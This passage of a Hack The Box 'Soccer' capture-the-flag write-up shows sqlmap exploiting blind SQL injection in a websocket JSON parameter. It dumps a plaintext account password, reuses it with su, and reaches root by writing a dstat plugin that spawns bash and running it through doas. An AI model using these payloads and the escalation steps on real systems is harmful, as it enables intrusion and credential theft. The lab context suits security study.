[18:27:22] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[18:27:23] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[18:27:23] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[18:27:23] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[18:27:23] [INFO] testing 'MySQL inline queries'
[18:27:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[18:27:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[18:27:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[18:27:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[18:27:24] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[18:27:25] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[18:27:25] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:27:36] [INFO] (custom) POST parameter 'JSON id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[18:27:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:27:36] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:27:37] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:27:38] [INFO] target URL appears to have 3 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[18:27:49] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[18:27:54] [INFO] testing 'Generic UNION query (42) - 21 to 40 columns'
[18:27:59] [INFO] testing 'Generic UNION query (42) - 41 to 60 columns'
[18:28:05] [INFO] testing 'Generic UNION query (42) - 61 to 80 columns'
[18:28:09] [INFO] testing 'Generic UNION query (42) - 81 to 100 columns'
[18:28:15] [INFO] testing 'MySQL UNION query (42) - 1 to 20 columns'
[18:28:25] [INFO] testing 'MySQL UNION query (42) - 21 to 40 columns'
[18:28:31] [INFO] testing 'MySQL UNION query (42) - 41 to 60 columns'
[18:28:35] [INFO] testing 'MySQL UNION query (42) - 61 to 80 columns'
[18:28:40] [INFO] testing 'MySQL UNION query (42) - 81 to 100 columns'
[18:28:45] [INFO] checking if the injection point on (custom) POST parameter 'JSON id' is a false positive
(custom) POST parameter 'JSON id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 346 HTTP(s) requests:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"id": "94530 AND 6914=6914"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id": "94530 AND (SELECT 3404 FROM (SELECT(SLEEP(5)))xhYU)"}
---
[18:28:51] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[18:28:53] [INFO] fetched data logged to text files under '/home/emvee/.local/share/sqlmap/output/soc-player.soccer.htb'
[18:28:53] [WARNING] your sqlmap version is outdated

[*] ending @ 18:28:53 /2024-03-08/



```
We have discovered a SQLi vulnerability. Now we can try to identify the database names.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Soccer]
└─$ sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "94530"}' --dbms mysql --batch --level 5 --risk 3 --threads 10 --dbs
        ___
       __H__                                                                             ___ ___[(]_____ ___ ___  {1.7.8#stable}                                                |_ -| . [,]     | .'| . |                                                               
|___|_  ["]_|_|_|__,|  _|                                    
      |_|V...       |_|   https://sqlmap.org                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:58:35 /2024-03-08/

JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[19:58:35] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"id": "94530 AND 6914=6914"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id": "94530 AND (SELECT 3404 FROM (SELECT(SLEEP(5)))xhYU)"}
---
[19:58:38] [INFO] testing MySQL
[19:58:38] [INFO] confirming MySQL
[19:58:38] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 8.0.0
[19:58:38] [INFO] fetching database names
[19:58:38] [INFO] fetching number of databases
[19:58:38] [INFO] resumed: 5
[19:58:38] [INFO] retrieving the length of query output
[19:58:38] [INFO] retrieved: 
[19:58:38] [INFO] retrieved: 
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[19:58:39] [INFO] resumed: mysql
[19:58:39] [INFO] retrieving the length of query output
[19:58:39] [INFO] retrieved: 
[19:58:39] [INFO] retrieved: 
[19:58:39] [INFO] resumed: information_schema
[19:58:39] [INFO] retrieving the length of query output
[19:58:39] [INFO] retrieved: 
[19:58:39] [INFO] retrieved: 
[19:58:40] [INFO] resuming partial value: perf
[19:58:40] [INFO] retrieved: 
[19:58:40] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[19:58:56] [INFO] adjusting time delay to 1 second due to good response times
ormanc
[19:59:21] [ERROR] invalid character detected. retrying..
[19:59:21] [WARNING] increasing time delay to 2 seconds
e_schema
[20:00:19] [INFO] retrieving the length of query output
[20:00:19] [INFO] retrieved: 
[20:00:20] [INFO] retrieved: 
[20:00:20] [INFO] retrieved: sys
[20:00:44] [INFO] retrieving the length of query output
[20:00:44] [INFO] retrieved: 
[20:00:44] [INFO] retrieved: 
[20:00:44] [INFO] retrieved: soccer_db
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys

[20:01:55] [INFO] fetched data logged to text files under '/home/emvee/.local/share/sqlmap/output/soc-player.soccer.htb'
[20:01:55] [WARNING] your sqlmap version is outdated

[*] ending @ 20:01:55 /2024-03-08/

```
We have found some database names. We should focus on `soccer_db` since the website is all about soccer. Since we have a database name we should now try to identify tables in the database.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Soccer]
└─$ sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "94530"}' --dbms mysql --batch --level 5 --risk 3 --threads 10 -D soccer_db --tables
        ___
       __H__                                                  
 ___ ___["]_____ ___ ___  {1.7.8#stable}                          
|_ -| . ["]     | .'| . |                                           
|___|_  [']_|_|_|__,|  _|                                    
      |_|V...       |_|   https://sqlmap.org                                                                                            
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:44:32 /2024-03-08/

JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[20:44:33] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"id": "94530 AND 6914=6914"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id": "94530 AND (SELECT 3404 FROM (SELECT(SLEEP(5)))xhYU)"}
---
[20:44:36] [INFO] testing MySQL
[20:44:36] [INFO] confirming MySQL
[20:44:36] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 8.0.0
[20:44:36] [INFO] fetching tables for database: 'soccer_db'
[20:44:36] [INFO] fetching number of tables for database 'soccer_db'
[20:44:36] [INFO] resumed: 1
[20:44:36] [INFO] retrieving the length of query output
[20:44:36] [INFO] retrieved: 
[20:44:36] [INFO] resumed: accountq
Database: soccer_db
[1 table]
+----------+
| accountq |
+----------+

[20:44:36] [INFO] fetched data logged to text files under '/home/emvee/.local/share/sqlmap/output/soc-player.soccer.htb'
[20:44:36] [WARNING] your sqlmap version is outdated

[*] ending @ 20:44:36 /2024-03-08/

```
There is one table found and it is called `accountq`, I believe this is wrong and it should be `accounts`. Let's try to dump the data in this table.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Soccer]
└─$ sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "94530"}' --dbms mysql --batch --level 5 --risk 3 --threads 10 -D soccer_db -T accounts --dump   
        ___
       __H__                                                
 ___ ___[.]_____ ___ ___  {1.7.8#stable}                      
|_ -| . [(]     | .'| . |                       
|___|_  [.]_|_|_|__,|  _|                          
      |_|V...       |_|   https://sqlmap.org                                                                                                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:48:23 /2024-03-08/

JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[20:48:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"id": "94530 AND 6914=6914"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id": "94530 AND (SELECT 3404 FROM (SELECT(SLEEP(5)))xhYU)"}
---
[20:48:27] [INFO] testing MySQL
[20:48:27] [INFO] confirming MySQL
[20:48:27] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 8.0.0
[20:48:27] [INFO] fetching columns for table 'accounts' in database 'soccer_db'
[20:48:27] [INFO] retrieved: 
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[20:48:27] [WARNING] time-based comparison requires larger statistical model, please wait.......................... (done)                                                                                                                 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[20:48:34] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
4
[20:48:34] [INFO] retrieving the length of query output
[20:48:34] [INFO] retrieved: 
[20:48:35] [INFO] retrieved: 
[20:48:35] [INFO] retrieved: 
[20:48:45] [INFO] adjusting time delay to 1 second due to good response times
id
[20:48:50] [INFO] retrieving the length of query output
[20:48:50] [INFO] retrieved: 
[20:48:51] [INFO] retrieved: 
[20:48:51] [INFO] retrieved: email
[20:49:08] [INFO] retrieving the length of query output
[20:49:08] [INFO] retrieved: 
[20:49:08] [INFO] retrieved: 
[20:49:09] [INFO] retrieved: username
[20:49:37] [INFO] retrieving the length of query output
[20:49:37] [INFO] retrieved: 
[20:49:37] [INFO] retrieved: 
[20:49:38] [INFO] retrieved: p
[20:49:48] [ERROR] invalid character detected. retrying..
[20:49:48] [WARNING] increasing time delay to 2 seconds
assword
[20:50:34] [INFO] fetching entries for table 'accounts' in database 'soccer_db'
[20:50:34] [INFO] fetching number of entries for table 'accounts' in database 'soccer_db'
[20:50:34] [INFO] retrieved: 
[20:50:34] [INFO] retrieved: 1
[20:50:37] [INFO] retrieving the length of query output
[20:50:37] [INFO] retrieved: 
[20:50:37] [INFO] retrieved: 
[20:50:38] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                                                    
player@player.htb
[20:52:50] [INFO] retrieving the length of query output
[20:52:50] [INFO] retrieved: 
[20:52:50] [INFO] retrieved: 
[20:52:50] [INFO] retrieved: 1324
[20:53:15] [INFO] retrieving the length of query output
[20:53:15] [INFO] retrieved: 
[20:53:15] [INFO] retrieved: 
[20:53:16] [INFO] retrieved: PlayerOftheMatch2022
[20:55:30] [INFO] retrieving the length of query output
[20:55:30] [INFO] retrieved: 
[20:55:31] [INFO] retrieved: 
[20:55:31] [INFO] retrieved: player
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+

[20:56:16] [INFO] table 'soccer_db.accounts' dumped to CSV file '/home/emvee/.local/share/sqlmap/output/soc-player.soccer.htb/dump/soccer_db/accounts.csv'
[20:56:16] [INFO] fetched data logged to text files under '/home/emvee/.local/share/sqlmap/output/soc-player.soccer.htb'
[20:56:16] [WARNING] your sqlmap version is outdated

[*] ending @ 20:56:16 /2024-03-08/

```
We have found a plaintext password for `player@player.htb`. We should add it to our notes first.
- PlayerOftheMatch2022
## Privilege escalation
Since we found some credentials for the user player, we should try to reuse the password while we switch to the user.
```bash
www-data@soccer:~/html/tiny/uploads$ su player
su player
Password: PlayerOftheMatch2022
ls
webshell.php
cd ~
cat user.txt
< HERE IS THE USER FLAG >

```

```bash
ls
user.txt
pwd
/home/player
find / -perm -4000 2>/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
/snap/snapd/17883/usr/lib/snapd/snap-confine
/snap/core20/1695/usr/bin/chfn
/snap/core20/1695/usr/bin/chsh
/snap/core20/1695/usr/bin/gpasswd
/snap/core20/1695/usr/bin/mount
/snap/core20/1695/usr/bin/newgrp
/snap/core20/1695/usr/bin/passwd
/snap/core20/1695/usr/bin/su
/snap/core20/1695/usr/bin/sudo
/snap/core20/1695/usr/bin/umount
/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1695/usr/lib/openssh/ssh-keysign

```

There is a SUID bit on `doas`. This is something like run as. First of all, we should search location of the  file `doas.conf`.

```bash
find / -type f -name "doas.conf" 2>/dev/null

/usr/local/etc/doas.conf


```
Then we should see what command can be executed as someone else.
```bash
cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat

```
We are able to run `/usr/bin/dstat`, but we should first investigate how we can use this to gain more privileges.

In [GTFObins dstat](https://gtfobins.github.io/gtfobins/dstat/#sudo) there is something mentioned about gaining more privileges on the system. via the sudo command. In our case we don't have sudo but doas. This might almost work the same.
First we should create a python plugin and give it a name.

```bash
echo -e 'import os\n\nos.system("/bin/bash")' > /usr/local/share/dstat/dstat_emvee.py
cat /usr/local/share/dstat/dstat_emvee.py
import os

os.system("/bin/bash")
```
As soon as we have configured the plugin we should run the command including the plugin name. Then a new shell should start as root.
```bash
doas /usr/bin/dstat --emvee
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
hostname
soccer
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:96:03:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.129.214.90/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2764sec preferred_lft 2764sec
    inet6 dead:beef::250:56ff:fe96:3e6/64 scope global dynamic mngtmpaddr 
       valid_lft 86396sec preferred_lft 14396sec
    inet6 fe80::250:56ff:fe96:3e6/64 scope link 
       valid_lft forever preferred_lft forever
```
We are root on the machine! Now we only have to capture the root flag.
```bash
ls ~
app
root.txt
run.sql
snap
cat ~/root.txt
< ROOT FLAG > 

```

